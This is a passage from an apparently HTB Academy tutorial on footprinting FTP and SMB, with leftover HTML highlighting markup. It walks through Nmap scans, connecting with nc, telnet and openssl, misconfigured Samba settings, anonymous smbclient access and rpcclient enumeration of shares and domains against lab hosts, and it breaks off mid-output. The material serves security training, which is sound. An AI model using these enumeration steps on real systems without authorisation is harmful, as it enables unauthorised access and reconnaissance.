NSOCK INFO [<span class="hljs-number">11.</span>4640s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID <span class="hljs-number">32</span> [<span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.136</span>:<span class="hljs-number">21</span>]
NSOCK INFO [<span class="hljs-number">11.</span>4640s] nsock_read(): Read request from IOD #<span class="hljs-number">1</span> [<span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.136</span>:<span class="hljs-number">21</span>] (timeout: 7000ms) EID <span class="hljs-number">42</span>
NSOCK INFO [<span class="hljs-number">11.</span>4640s] nsock_read(): Read request from IOD #<span class="hljs-number">2</span> [<span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.136</span>:<span class="hljs-number">21</span>] (timeout: 9000ms) EID <span class="hljs-number">50</span>
NSOCK INFO [<span class="hljs-number">11.</span>4640s] nsock_read(): Read request from IOD #<span class="hljs-number">3</span> [<span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.136</span>:<span class="hljs-number">21</span>] (timeout: 7000ms) EID <span class="hljs-number">58</span>
NSOCK INFO [<span class="hljs-number">11.</span>4640s] nsock_read(): Read request from IOD #<span class="hljs-number">4</span> [<span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.136</span>:<span class="hljs-number">21</span>] (timeout: 11000ms) EID <span class="hljs-number">66</span>
<span class="hljs-symbol">NSE:</span> TCP <span class="hljs-number">10.10</span><span class="hljs-meta">.14</span><span class="hljs-meta">.4</span>:<span class="hljs-number">54226</span> &gt; <span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.136</span>:<span class="hljs-number">21</span> | CONNECT
<span class="hljs-symbol">NSE:</span> TCP <span class="hljs-number">10.10</span><span class="hljs-meta">.14</span><span class="hljs-meta">.4</span>:<span class="hljs-number">54228</span> &gt; <span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.136</span>:<span class="hljs-number">21</span> | CONNECT
<span class="hljs-symbol">NSE:</span> TCP <span class="hljs-number">10.10</span><span class="hljs-meta">.14</span><span class="hljs-meta">.4</span>:<span class="hljs-number">54230</span> &gt; <span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.136</span>:<span class="hljs-number">21</span> | CONNECT
<span class="hljs-symbol">NSE:</span> TCP <span class="hljs-number">10.10</span><span class="hljs-meta">.14</span><span class="hljs-meta">.4</span>:<span class="hljs-number">54232</span> &gt; <span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.136</span>:<span class="hljs-number">21</span> | CONNECT
NSOCK INFO [<span class="hljs-number">11.</span>4660s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID <span class="hljs-number">50</span> [<span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.136</span>:<span class="hljs-number">21</span>] (<span class="hljs-number">41</span> bytes): <span class="hljs-number">220</span> Welcome to HTB-Academy FTP service...
NSOCK INFO [<span class="hljs-number">11.</span>4660s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID <span class="hljs-number">58</span> [<span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.136</span>:<span class="hljs-number">21</span>] (<span class="hljs-number">41</span> bytes): <span class="hljs-number">220</span> Welcome to HTB-Academy FTP service...
<span class="hljs-symbol">NSE:</span> TCP <span class="hljs-number">10.10</span><span class="hljs-meta">.14</span><span class="hljs-meta">.4</span>:<span class="hljs-number">54228</span> &lt; <span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.136</span>:<span class="hljs-number">21</span> | <span class="hljs-number">220</span> Welcome to HTB-Academy FTP service.
</code></pre>
<p>The scan history shows that four different parallel scans are running against the service, with various timeouts. For the NSE scripts, we see that our local machine uses other output ports (<code>54226</code>, <code>54228</code>, <code>54230</code>, <code>54232</code>) and first initiates the connection with the <code>CONNECT</code> command. From the first response from the server, we can see that we are receiving the banner from the server to our second NSE script (<code>54228</code>) from the target FTP server. If necessary, we can, of course, use other applications such as <code>netcat</code> or <code>telnet</code> to interact with the FTP server.</p>
<p><strong>Service Interaction</strong></p>
<p>FTP</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ nc -nv <span class="hljs-number">10.129</span><span class="hljs-number">.14</span><span class="hljs-number">.136</span> <span class="hljs-number">21</span>
</code></pre>
<p>FTP</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ telnet <span class="hljs-number">10.129</span><span class="hljs-number">.14</span><span class="hljs-number">.136</span> <span class="hljs-number">21</span>
</code></pre>
<p>It looks slightly different if the FTP server runs with TLS/SSL encryption. Because then we need a client that can handle TLS/SSL. For this, we can use the client <code>openssl</code> and communicate with the FTP server. The good thing about using <code>openssl</code> is that we can see the SSL certificate, which can also be helpful.</p>
<p>FTP</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ openssl s_client -connect <span class="hljs-number">10.129</span>.<span class="hljs-number">14.136</span>:<span class="hljs-number">21</span> -starttls ftp

CONNECTED(<span class="hljs-number">00000003</span>)                                                                                      
Can't use SSL_get_servername                        
<span class="hljs-attr">depth=0</span> <span class="hljs-attr">C</span> = US, <span class="hljs-attr">ST</span> = California, <span class="hljs-attr">L</span> = Sacramento, <span class="hljs-attr">O</span> = Inlanefreight, <span class="hljs-attr">OU</span> = Dev, <span class="hljs-attr">CN</span> = master.inlanefreight.htb, <span class="hljs-attr">emailAddress</span> = admin@inlanefreight.htb
verify error:<span class="hljs-attr">num=18:self</span> signed certificate
verify return:<span class="hljs-number">1</span>

<span class="hljs-attr">depth=0</span> <span class="hljs-attr">C</span> = US, <span class="hljs-attr">ST</span> = California, <span class="hljs-attr">L</span> = Sacramento, <span class="hljs-attr">O</span> = Inlanefreight, <span class="hljs-attr">OU</span> = Dev, <span class="hljs-attr">CN</span> = master.inlanefreight.htb, <span class="hljs-attr">emailAddress</span> = admin@inlanefreight.htb
verify return:<span class="hljs-number">1</span>
---                                                 
Certificate chain
 <span class="hljs-number">0</span> s:<span class="hljs-attr">C</span> = US, <span class="hljs-attr">ST</span> = California, <span class="hljs-attr">L</span> = Sacramento, <span class="hljs-attr">O</span> = Inlanefreight, <span class="hljs-attr">OU</span> = Dev, <span class="hljs-attr">CN</span> = master.inlanefreight.htb, <span class="hljs-attr">emailAddress</span> = admin@inlanefreight.htb

 i:<span class="hljs-attr">C</span> = US, <span class="hljs-attr">ST</span> = California, <span class="hljs-attr">L</span> = Sacramento, <span class="hljs-attr">O</span> = Inlanefreight, <span class="hljs-attr">OU</span> = Dev, <span class="hljs-attr">CN</span> = master.inlanefreight.htb, <span class="hljs-attr">emailAddress</span> = admin@inlanefreight.htb
---

Server certificate

-----BEGIN CERTIFICATE-----

MIIENTCCAx2gAwIBAgIUD+SlFZAWzX5yLs2q3ZcfdsRQqMYwDQYJKoZIhvcNAQEL
...SNIP...
</code></pre>
<p>This is because the SSL certificate allows us to recognize the <code>hostname</code>, for example, and in most cases also an <code>email address</code> for the organization or company. In addition, if the company has several locations worldwide, certificates can also be created for specific locations, which can also be identified using the SSL certificate.</p>
<h2 id="smb">SMB</h2>
<hr>
<p><code>Server Message Block</code> (<code>SMB</code>) is a client-server protocol that regulates access to files and entire directories and other network resources such as printers, routers, or interfaces released for the network. Information exchange between different system processes can also be handled based on the SMB protocol. <a href="https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-smb/f210069c-7086-4dc2-885e-861d837df688">SMB</a> first became available to a broader public, for example, as part of the OS/2 network operating system LAN Manager and LAN Server. Since then, the main application area of the protocol has been the Windows operating system series in particular, whose network services support SMB in a downward-compatible manner - which means that devices with newer editions can easily communicate with devices that have an older Microsoft operating system installed. With the free software project Samba, there is also a solution that enables the use of SMB in Linux and Unix distributions and thus cross-platform communication via SMB.</p>
<p>The SMB protocol enables the client to communicate with other participants in the same network to access files or services shared with it on the network. The other system must also have implemented the network protocol and received and processed the client request using an SMB server application. Before that, however, both parties must establish a connection, which is why they first exchange corresponding messages.</p>
<p>In IP networks, SMB uses TCP protocol for this purpose, which provides for a three-way handshake between client and server before a connection is finally established. The specifications of the TCP protocol also govern the subsequent transport of data. We can take a look at some examples <a href="https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-SMB2/\[MS-SMB2].pdf#%5B%7B%22num%22%3A920%2C%22gen%22%3A0%7D%2C%7B%22name%22%3A%22XYZ%22%7D%2C69%2C738%2C0%5D">here</a>.</p>
<p>An SMB server can provide arbitrary parts of its local file system as shares. Therefore the hierarchy visible to a client is partially independent of the structure on the server. Access rights are defined by <code>Access Control Lists</code> (<code>ACL</code>). They can be controlled in a fine-grained manner based on attributes such as <code>execute</code>, <code>read</code>, and <code>full access</code> for individual users or user groups. The ACLs are defined based on the shares and therefore do not correspond to the rights assigned locally on the server.</p>
<hr>
<h3 id="samba">Samba</h3>
<p>As mentioned earlier, there is an alternative variant to the SMB server, called Samba, developed for Unix-based operating system. Samba implements the <code>Common Internet File System</code> (<code>CIFS</code>) network protocol. <a href="https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-cifs/934c2faa-54af-4526-ac74-6a24d126724e">CIFS</a> is a &quot;dialect&quot; of SMB. In other words, CIFS is a very specific implementation of the SMB protocol, which in turn was created by Microsoft. This allows Samba to communicate with newer Windows systems. Therefore, it usually is referred to as <code>SMB / CIFS</code>. However, CIFS is the extension of the SMB protocol. So when we pass SMB commands over Samba to an older NetBIOS service, it usually connects to the Samba server over TCP ports <code>137</code>, <code>138</code>, <code>139</code>, but CIFS uses TCP port <code>445</code> only. There are several versions of SMB, including outdated versions that are still used in specific infrastructures.</p>
<table>
<thead>
<tr>
<th><strong>SMB Version</strong></th>
<th><strong>Supported</strong></th>
<th><strong>Features</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>CIFS</td>
<td>Windows NT 4.0</td>
<td>Communication via NetBIOS interface</td>
</tr>
<tr>
<td>SMB 1.0</td>
<td>Windows 2000</td>
<td>Direct connection via TCP</td>
</tr>
<tr>
<td>SMB 2.0</td>
<td>Windows Vista, Windows Server 2008</td>
<td>Performance upgrades, improved message signing, caching feature</td>
</tr>
<tr>
<td>SMB 2.1</td>
<td>Windows 7, Windows Server 2008 R2</td>
<td>Locking mechanisms</td>
</tr>
<tr>
<td>SMB 3.0</td>
<td>Windows 8, Windows Server 2012</td>
<td>Multichannel connections, end-to-end encryption, remote storage access</td>
</tr>
<tr>
<td>SMB 3.0.2</td>
<td>Windows 8.1, Windows Server 2012 R2</td>
<td></td>
</tr>
<tr>
<td>SMB 3.1.1</td>
<td>Windows 10, Windows Server 2016</td>
<td>Integrity checking, AES-128 encryption</td>
</tr>
</tbody>
</table>
<p>With version 3, the Samba server gained the ability to be a full member of an Active Directory domain. With version 4, Samba even provides an Active Directory domain controller. It contains several so-called daemons for this purpose - which are Unix background programs. The SMB server daemon (<code>smbd</code>) belonging to Samba provides the first two functionalities, while the NetBIOS message block daemon (<code>nmbd</code>) implements the last two functionalities. The SMB service controls these two background programs.</p>
<p>We know that Samba is suitable for both Linux and Windows systems. In a network, each host participates in the same <code>workgroup</code>. A workgroup is a group name that identifies an arbitrary collection of computers and their resources on an SMB network. There can be multiple workgroups on the network at any given time. IBM developed an <code>application programming interface</code> (<code>API</code>) for networking computers called the <code>Network Basic Input/Output System</code> (<code>NetBIOS</code>). The NetBIOS API provided a blueprint for an application to connect and share data with other computers. In a NetBIOS environment, when a machine goes online, it needs a name, which is done through the so-called <code>name registration</code> procedure. Either each host reserves its hostname on the network, or the <a href="https://networkencyclopedia.com/netbios-name-server-nbns/">NetBIOS Name Server</a> (<code>NBNS</code>) is used for this purpose. It also has been enhanced to <a href="https://networkencyclopedia.com/windows-internet-name-service-wins/">Windows Internet Name Service</a> (<code>WINS</code>).</p>
<hr>
<h3 id="default-configuration">Default Configuration</h3>
<p>As we can imagine, Samba offers a wide range of <a href="https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html">settings</a> that we can configure. Again, we define the settings via a text file where we can get an overview of some of the settings. These settings look like the following when filtered out:</p>
<p><strong>Default Configuration</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ cat /etc/samba/smb.conf | grep -v <span class="hljs-string">"#\|\;"</span> 

[global]
   <span class="hljs-attr">workgroup</span> = DEV.INFREIGHT.HTB
   server <span class="hljs-attr">string</span> = DEVSMB
   log <span class="hljs-attr">file</span> = /var/log/samba/log.%m
   max log <span class="hljs-attr">size</span> = <span class="hljs-number">1000</span>
   <span class="hljs-attr">logging</span> = file
   panic <span class="hljs-attr">action</span> = /usr/share/samba/panic-action %d

   server <span class="hljs-attr">role</span> = standalone server
   obey pam <span class="hljs-attr">restrictions</span> = yes
   unix password <span class="hljs-attr">sync</span> = yes

   passwd <span class="hljs-attr">program</span> = /usr/bin/passwd %u
   passwd <span class="hljs-attr">chat</span> = *Enter\snew\s*\spassword:* %n\n *Retype\snew\s*\spassword:* %n\n *password\supdated\ssuccessfully* .

   pam password <span class="hljs-attr">change</span> = yes
   <span class="hljs-built_in">map</span> to <span class="hljs-attr">guest</span> = bad user
   usershare allow <span class="hljs-attr">guests</span> = yes

[printers]
   <span class="hljs-attr">comment</span> = All Printers
   <span class="hljs-attr">browseable</span> = no
   <span class="hljs-attr">path</span> = /var/spool/samba
   <span class="hljs-attr">printable</span> = yes
   guest <span class="hljs-attr">ok</span> = no
   read <span class="hljs-attr">only</span> = yes
   create <span class="hljs-attr">mask</span> = <span class="hljs-number">0700</span>

[print$]
   <span class="hljs-attr">comment</span> = Printer Drivers
   <span class="hljs-attr">path</span> = /var/lib/samba/printers
   <span class="hljs-attr">browseable</span> = yes
   read <span class="hljs-attr">only</span> = yes
   guest <span class="hljs-attr">ok</span> = no
</code></pre>
<p>We see global settings and two shares that are intended for printers. The global settings are the configuration of the available SMB server that is used for all shares. In the individual shares, however, the global settings can be overwritten, which can be configured with high probability even incorrectly. Let us look at some of the settings to understand how the shares are configured in Samba.</p>
<table>
<thead>
<tr>
<th><strong>Setting</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>[sharename]</code></td>
<td>The name of the network share.</td>
</tr>
<tr>
<td><code>workgroup = WORKGROUP/DOMAIN</code></td>
<td>Workgroup that will appear when clients query.</td>
</tr>
<tr>
<td><code>path = /path/here/</code></td>
<td>The directory to which user is to be given access.</td>
</tr>
<tr>
<td><code>server string = STRING</code></td>
<td>The string that will show up when a connection is initiated.</td>
</tr>
<tr>
<td><code>unix password sync = yes</code></td>
<td>Synchronize the UNIX password with the SMB password?</td>
</tr>
<tr>
<td><code>usershare allow guests = yes</code></td>
<td>Allow non-authenticated users to access defined share?</td>
</tr>
<tr>
<td><code>map to guest = bad user</code></td>
<td>What to do when a user login request doesn&#39;t match a valid UNIX user?</td>
</tr>
<tr>
<td><code>browseable = yes</code></td>
<td>Should this share be shown in the list of available shares?</td>
</tr>
<tr>
<td><code>guest ok = yes</code></td>
<td>Allow connecting to the service without using a password?</td>
</tr>
<tr>
<td><code>read only = yes</code></td>
<td>Allow users to read files only?</td>
</tr>
<tr>
<td><code>create mask = 0700</code></td>
<td>What permissions need to be set for newly created files?</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="dangerous-settings">Dangerous Settings</h3>
<p>Some of the above settings already bring some sensitive options. However, suppose we question the settings listed below and ask ourselves what the employees could gain from them, as well as attackers. In that case, we will see what advantages and disadvantages the settings bring with them. Let us take the setting <code>browseable = yes</code> as an example. If we as administrators adopt this setting, the company&#39;s employees will have the comfort of being able to look at the individual folders with the contents. Many folders are eventually used for better organization and structure. If the employee can browse through the shares, the attacker will also be able to do so after successful access.</p>
<table>
<thead>
<tr>
<th><strong>Setting</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>browseable = yes</code></td>
<td>Allow listing available shares in the current share?</td>
</tr>
<tr>
<td><code>read only = no</code></td>
<td>Forbid the creation and modification of files?</td>
</tr>
<tr>
<td><code>writable = yes</code></td>
<td>Allow users to create and modify files?</td>
</tr>
<tr>
<td><code>guest ok = yes</code></td>
<td>Allow connecting to the service without using a password?</td>
</tr>
<tr>
<td><code>enable privileges = yes</code></td>
<td>Honor privileges assigned to specific SID?</td>
</tr>
<tr>
<td><code>create mask = 0777</code></td>
<td>What permissions must be assigned to the newly created files?</td>
</tr>
<tr>
<td><code>directory mask = 0777</code></td>
<td>What permissions must be assigned to the newly created directories?</td>
</tr>
<tr>
<td><code>logon script = script.sh</code></td>
<td>What script needs to be executed on the user&#39;s login?</td>
</tr>
<tr>
<td><code>magic script = script.sh</code></td>
<td>Which script should be executed when the script gets closed?</td>
</tr>
<tr>
<td><code>magic output = script.out</code></td>
<td>Where the output of the magic script needs to be stored?</td>
</tr>
</tbody>
</table>
<p>Let us create a share called <code>[notes]</code> and a few others and see how the settings affect our enumeration process. We will use all of the above settings and apply them to this share. For example, this setting is often applied, if only for testing purposes. If it is then an internal subnet of a small team in a large department, this setting is often retained or forgotten to be reset. This leads to the fact that we can browse through all the shares and, with high probability, even download and inspect them.</p>
<p><strong>Example Share</strong></p>
<pre><code class="lang-shell-session">...SNIP...

[notes]
    <span class="hljs-keyword">comment</span> = CheckIT
    <span class="hljs-keyword">path</span> = /mnt/notes/

    browseable = yes
    <span class="hljs-keyword">read</span> <span class="hljs-keyword">only</span> = <span class="hljs-keyword">no</span>
    writable = yes
    guest ok = yes

    <span class="hljs-keyword">enable</span> <span class="hljs-keyword">privileges</span> = yes
    <span class="hljs-keyword">create</span> <span class="hljs-keyword">mask</span> = <span class="hljs-number">0777</span>
    <span class="hljs-keyword">directory</span> <span class="hljs-keyword">mask</span> = <span class="hljs-number">0777</span>
</code></pre>
<p>It is highly recommended to look at the man pages for Samba and configure it ourselves and experiment with the settings. We will then discover potential aspects that will be interesting for us as a penetration tester. In addition, the more familiar we become with the Samba server and SMB, the easier it will be to find our way around the environment and use it for our purposes. Once we have adjusted <code>/etc/samba/smb.conf</code> to our needs, we have to restart the service on the server.</p>
<p><strong>Restart Samba</strong></p>
<pre><code class="lang-shell-session">root<span class="hljs-variable">@samba</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># sudo systemctl restart smbd</span>
</code></pre>
<p>Now we can display a list (<code>-L</code>) of the server&#39;s shares with the <code>smbclient</code> command from our host. We use the so-called <code>null session</code> (<code>-N</code>), which is <code>anonymous</code> access without the input of existing users or valid passwords.</p>
<p><strong>SMBclient - Connecting to the Share</strong></p>
<pre><code class="lang-shell-session">[!bash!]<span class="hljs-symbol">$</span> smbclient -N -L <span class="hljs-comment">//10.129.14.128</span>

        Sharename       Type      Comment
        ---------       ----      -------
        print<span class="hljs-symbol">$</span>          Disk      Printer Drivers
        home            Disk      INFREIGHT Samba
        dev             Disk      DEVenv
        notes           Disk      CheckIT
        IPC<span class="hljs-symbol">$</span>            IPC       IPC Service (DEVSM)
SMB1 disabled -- <span class="hljs-keyword">no</span> workgroup available
</code></pre>
<p>We can see that we now have five different shares on the Samba server from the result. Thereby <code>print$</code> and an <code>IPC$</code> are already included by default in the basic setting, as we have already seen. Since we deal with the <code>[notes]</code> share, let us log in and inspect it using the same client program. If we are not familiar with the client program, we can use the <code>help</code> command on successful login, listing all the possible commands we can execute.</p>
<pre><code class="lang-shell-session">[!bash!]$ smbclient <span class="hljs-comment">//10.129.14.128/notes</span>

Enter WORKGROUP\&lt;username&gt;'s password: 
Anonymous login successful
Try <span class="hljs-string">"help"</span> to get a <span class="hljs-keyword">list</span> of possible commands.


smb: \&gt; <span class="hljs-keyword">help</span>

?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive <span class="hljs-keyword">cd</span>             chmod          
chown          <span class="hljs-keyword">close</span>          del            deltree        <span class="hljs-keyword">dir</span>            
du             echo           <span class="hljs-keyword">exit</span>           get            getfacl        
geteas         hardlink       <span class="hljs-keyword">help</span>           history        iosize         
lcd            link           lock           lowercase      <span class="hljs-keyword">ls</span>             
<span class="hljs-keyword">l</span>              mask           md             mget           <span class="hljs-keyword">mkdir</span>          
<span class="hljs-keyword">more</span>           mput           newer          notify         <span class="hljs-keyword">open</span>           
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
posix_unlink   posix_whoami   <span class="hljs-keyword">print</span>          prompt         put            
<span class="hljs-keyword">pwd</span>            q              queue          quit           readlink       
rd             recurse        reget          <span class="hljs-keyword">rename</span>         reput          
<span class="hljs-keyword">rm</span>             <span class="hljs-keyword">rmdir</span>          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        <span class="hljs-keyword">translate</span>      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!            


smb: \&gt; <span class="hljs-keyword">ls</span>

  .                                   <span class="hljs-keyword">D</span>        0  Wed Sep 22 18:17:51 2021
  ..                                  <span class="hljs-keyword">D</span>        0  Wed Sep 22 12:03:59 2021
  prep-prod.txt                       <span class="hljs-keyword">N</span>       71  Sun Sep 19 15:45:21 2021

                30313412 blocks of size 1024. 16480084 blocks available
</code></pre>
<p>Once we have discovered interesting files or folders, we can download them using the <code>get</code> command. Smbclient also allows us to execute local system commands using an exclamation mark at the beginning (<code>!&lt;cmd&gt;</code>) without interrupting the connection.</p>
<p><strong>Download Files from SMB</strong></p>
<pre><code class="lang-shell-session"><span class="hljs-attribute">smb</span>: \&gt; get prep-prod.txt 

<span class="stylus">getting file \prep-prod<span class="hljs-selector-class">.txt</span> of size <span class="hljs-number">71</span> as prep-prod<span class="hljs-selector-class">.txt</span> (<span class="hljs-number">8</span>,<span class="hljs-number">7</span> KiloBytes/sec) 
(average <span class="hljs-number">8</span>,<span class="hljs-number">7</span> KiloBytes/sec)


smb: \&gt; !ls

prep-prod<span class="hljs-selector-class">.txt</span>


smb: \&gt; !cat prep-prod<span class="hljs-selector-class">.txt</span>

[] check your <span class="hljs-selector-tag">code</span> with the templates
[] run code-assessment<span class="hljs-selector-class">.py</span>
[] </span>
</code></pre>
<p>From the administrative point of view, we can check these connections using <code>smbstatus</code>. Apart from the Samba version, we can also see who, from which host, and which share the client is connected. This is especially important once we have entered a subnet (perhaps even an isolated one) that the others can still access.</p>
<p>For example, with domain-level security, the samba server acts as a member of a Windows domain. Each domain has at least one domain controller, usually a Windows NT server providing password authentication. This domain controller provides the workgroup with a definitive password server. The domain controllers keep track of users and passwords in their own <code>Security Authentication Module</code> (<code>SAM</code>) and authenticate each user when they log in for the first time and wish to access another machine&#39;s share.</p>
<p><strong>Samba Status</strong></p>
<pre><code class="lang-shell-session">root@samba:~# smbstatus

Samba version 4.11.6-Ubuntu
<span class="hljs-section">PID     Username     Group        Machine                                   Protocol Version  Encryption           Signing              
----------------------------------------------------------------------------------------------------------------------------------------</span>
75691   sambauser    samba        10.10.14.4 (ipv4:10.10.14.4:45564)      SMB3<span class="hljs-emphasis">_11           -                    -                    

</span><span class="hljs-section">Service      pid     Machine       Connected at                     Encryption   Signing     
---------------------------------------------------------------------------------------------</span>
notes        75691   10.10.14.4   Do Sep 23 00:12:06 2021 CEST     -            -           

No locked files
</code></pre>
<hr>
<h3 id="footprinting-the-service">Footprinting the Service</h3>
<p>Let us go back to one of our enumeration tools. Nmap also has many options and NSE scripts that can help us examine the target&#39;s SMB service more closely and get more information. The downside, however, is that these scans can take a long time. Therefore, it is also recommended to look at the service manually, mainly because we can find much more details than Nmap could show us. First, however, let us see what Nmap can find on our target Samba server, where we created the <code>[notes]</code> share for testing purposes.</p>
<p><strong>Nmap</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ sudo nmap <span class="hljs-number">10.129</span><span class="hljs-number">.14</span><span class="hljs-number">.128</span> -sV -sC -p139,<span class="hljs-number">445</span>

Starting Nmap <span class="hljs-number">7.80</span> ( <span class="hljs-string">https:</span><span class="hljs-comment">//nmap.org ) at 2021-09-19 15:15 CEST</span>
Nmap scan report <span class="hljs-keyword">for</span> sharing.inlanefreight.htb (<span class="hljs-number">10.129</span><span class="hljs-number">.14</span><span class="hljs-number">.128</span>)
Host is up (<span class="hljs-number">0.00024</span>s latency).

PORT    STATE SERVICE     VERSION
<span class="hljs-number">139</span>/tcp open  netbios-ssn Samba smbd <span class="hljs-number">4.6</span><span class="hljs-number">.2</span>
<span class="hljs-number">445</span>/tcp open  netbios-ssn Samba smbd <span class="hljs-number">4.6</span><span class="hljs-number">.2</span>
MAC <span class="hljs-string">Address:</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> (VMware)

Host script <span class="hljs-string">results:</span>
|<span class="hljs-string">_nbstat:</span> NetBIOS <span class="hljs-string">name:</span> HTB, NetBIOS <span class="hljs-string">user:</span> &lt;unknown&gt;, NetBIOS <span class="hljs-string">MAC:</span> &lt;unknown&gt; (unknown)
| smb2-security-<span class="hljs-string">mode:</span> 
|   <span class="hljs-number">2.02</span>: 
|_    Message signing enabled but not required
| smb2-<span class="hljs-string">time:</span> 
|   <span class="hljs-string">date:</span> <span class="hljs-number">2021</span><span class="hljs-number">-09</span><span class="hljs-number">-19</span><span class="hljs-string">T13:</span><span class="hljs-number">16</span>:<span class="hljs-number">04</span>
|_  <span class="hljs-string">start_date:</span> N/A

Service detection performed. Please report any incorrect results at <span class="hljs-string">https:</span><span class="hljs-comment">//nmap.org/submit/ .</span>
Nmap <span class="hljs-string">done:</span> <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">11.35</span> seconds
</code></pre>
<p>We can see from the results that it is not very much that Nmap provided us with here. Therefore, we should resort to other tools that allow us to interact manually with the SMB and send specific requests for the information. One of the handy tools for this is <code>rpcclient</code>. This is a tool to perform MS-RPC functions.</p>
<p>The <a href="https://www.geeksforgeeks.org/remote-procedure-call-rpc-in-operating-system/">Remote Procedure Call</a> (<code>RPC</code>) is a concept and, therefore, also a central tool to realize operational and work-sharing structures in networks and client-server architectures. The communication process via RPC includes passing parameters and the return of a function value.</p>
<p><strong>RPCclient</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ rpcclient -U <span class="hljs-string">""</span> <span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.128</span>

<span class="hljs-keyword">Enter</span> WORKGROUP\<span class="hljs-string">'s password:
rpcclient $&gt;</span>
</code></pre>
<p>The <code>rpcclient</code> offers us many different requests with which we can execute specific functions on the SMB server to get information. A complete list of all these functions can be found on the <a href="https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html">man page</a> of the rpcclient.</p>
<table>
<thead>
<tr>
<th><strong>Query</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>srvinfo</code></td>
<td>Server information.</td>
</tr>
<tr>
<td><code>enumdomains</code></td>
<td>Enumerate all domains that are deployed in the network.</td>
</tr>
<tr>
<td><code>querydominfo</code></td>
<td>Provides domain, server, and user information of deployed domains.</td>
</tr>
<tr>
<td><code>netshareenumall</code></td>
<td>Enumerates all available shares.</td>
</tr>
<tr>
<td><code>netsharegetinfo &lt;share&gt;</code></td>
<td>Provides information about a specific share.</td>
</tr>
<tr>
<td><code>enumdomusers</code></td>
<td>Enumerates all domain users.</td>
</tr>
<tr>
<td><code>queryuser &lt;RID&gt;</code></td>
<td>Provides information about a specific user.</td>
</tr>
</tbody>
</table>
<p><strong>RPCclient - Enumeration</strong></p>
<pre><code class="lang-shell-session">rpcclient $&gt; srvinfo

        DEVSMB         Wk Sv PrQ Unx NT SNT DEVSM
        platform_id     :       <span class="hljs-number">500</span>
        os version      :       <span class="hljs-number">6.1</span>
        server type     :       <span class="hljs-number">0x809a03</span>


rpcclient $&gt; enumdomains

<span class="hljs-attr">name:</span>[DEVSMB] idx:[<span class="hljs-number">0x0</span>]
<span class="hljs-attr">name:</span>[Builtin] idx:[<span class="hljs-number">0x1</span>]


rpcclient $&gt; querydominfo

<span class="hljs-attr">Domain:</span>         DEVOPS
<span class="hljs-attr">Server:</span>         DEVSMB
<span class="hljs-attr">Comment:</span>        DEVSM
Total Users:    <span class="hljs-number">2</span>
Total Groups:   <span class="hljs-number">0</span>
Total Aliases:  <span class="hljs-number">0</span>
Sequence <span class="hljs-literal">No</span>:    <span class="hljs-number">1632361158</span>
Force Logoff:   <span class="hljs-bullet">-1</span>
Domain Server State:    <span class="hljs-number">0x1</span>
Server Role:    ROLE_DOMAIN_PDC
Unknown <span class="hljs-number">3</span>:      <span class="hljs-number">0x1</span>


rpcclient $&gt; netshareenumall

<span class="hljs-attr">netname:</span> print$
<span class="hljs-attr">        remark:</span> Printer Drivers
<span class="hljs-attr">        path:</span>   C:\var\lib\samba\printers
<span class="hljs-attr">        password:</span>
<span class="hljs-attr">netname:</span> home
<span class="hljs-attr">        remark:</span> INFREIGHT Samba
<span class="hljs-attr">        path:</span>   C:\home\
<span class="hljs-attr">        password:</span>
<span class="hljs-attr">netname:</span> dev
<span class="hljs-attr">        remark:</span> DEVenv
<span class="hljs-attr">        path:</span>   C:\home\sambauser\dev\
<span class="hljs-attr">        password:</span>
<span class="hljs-attr">netname:</span> notes
<span class="hljs-attr">        remark:</span> CheckIT
<span class="hljs-attr">        path:</span>   C:\mnt\notes\
<span class="hljs-attr">        password:</span>
<span class="hljs-attr">netname:</span> IPC$
<span class="hljs-attr">        remark:</span> IPC Service (DEVSM)
<span class="hljs-attr">        path:</span>   C:\tmp
<span class="hljs-attr">        password:</span>


rpcclient $&gt; netsharegetinfo notes

<span class="hljs-attr">netname:</span> notes
